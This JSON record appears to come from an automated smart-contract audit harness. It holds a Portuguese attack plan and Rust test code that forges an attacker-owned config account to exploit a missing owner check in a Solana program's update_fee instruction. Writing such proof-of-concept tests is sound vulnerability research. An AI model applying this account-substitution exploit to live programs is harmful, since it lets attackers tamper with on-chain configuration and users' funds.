attempts.raw:
{
  "plan": "O atacante cria uma conta forjada cujo owner é um programa malicioso (env.attacker_program) e cujos bytes 8..40 contêm a pubkey do atacante. O baseline usa uma conta config legítima (owner = env.program_id) com o admin correto e a authority assinante, provando que o cenário está montado. O ataque passa a mesma authority assinante, mas substitui a conta config pela conta forjada, cujo admin (bytes 8..40) é a pubkey do atacante. O efeito mede que a conta forjada teve seus bytes 40..48 alterados para o novo fee, apesar de não pertencer ao programa.",
  "scenario": "let attacker = Pubkey::new_unique();
let authority = Pubkey::new_unique();
let new_fee: u64 = 999_999;

// Conta config legitima: owner = env.program_id, admin = authority
let mut legit_data = vec![0u8; 48];
legit_data[8..40].copy_from_slice(authority.as_ref());
let legit_config = account(&env.program_id, &legit_data, None);

// Conta forjada: owner = programa do atacante, admin = attacker
let mut forged_data = vec![0u8; 48];
forged_data[8..40].copy_from_slice(attacker.as_ref());
let forged_config = account(&env.attacker_program.unwrap(), &forged_data, None);

let authority_account = wallet(1_000_000_000);

// Baseline: uso legitimo com a conta config correta
let ix_baseline = env.raw_ix(
    &[IX_UPDATE_FEE, new_fee.to_le_bytes().as_ref()].concat(),
    &[
        AccountMeta::new(legit_config_key, false),
        AccountMeta::new_readonly(authority, true),
    ],
);
let contas_baseline = vec![
    (legit_config_key, legit_config),
    (authority, authority_account.clone()),
];
let r_base = env.baseline("update_fee legitimo", &ix_baseline, &contas_baseline);

// Ataque: mesma authority assinante, mas config forjada com owner do atacante
let ix_attack = env.raw_ix(
    &[IX_UPDATE_FEE, new_fee.to_le_bytes().as_ref()].concat(),
    &[
        AccountMeta::new(forged_config_key, false),
        AccountMeta::new_readonly(authority, true),
    ],
);
let contas_attack = vec![
    (forged_config_key, forged_config),
    (authority, authority_account),
];
let r = env.attack("update_fee com config forjada", &ix_attack, &contas_attack);

if r.program_result == ProgramResult::Success {
    let forged_after = after(&r, &forged_config_key);
    env.effect(
        "conta forjada (owner != program_id) teve bytes 40..48 alterados",
        read_u64(forged_after.data(), 40) == new_fee,
    );
}"
}

